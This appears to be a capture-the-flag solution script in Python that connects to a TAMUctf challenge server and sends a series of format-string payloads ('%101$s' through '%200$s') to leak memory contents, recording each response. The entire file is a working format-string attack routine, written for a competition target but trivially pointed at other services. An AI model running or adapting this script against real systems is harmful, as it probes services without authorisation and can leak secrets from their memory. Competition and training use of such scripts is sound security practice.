import socket

ss = []
def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))

    init = s.recv(1024).decode('utf-8')

    s.send(str.encode(content + '\n'))
    print('Sending : ' + content)
    
    data = repr(s.recv(1024))[2:-1].replace('\\n', '')
    if data == '':
        #print('Nothing received')
        return
##    print('='*50)
##    print(data)
    ss.append([content, data])

    s.shutdown(socket.SHUT_WR)
    print("Connection closed.")
    s.close()

for i in range(101, 201):
    netcat('challenges.tamuctf.com', 4251, '%'+str(i)+'$s')

print(ss)
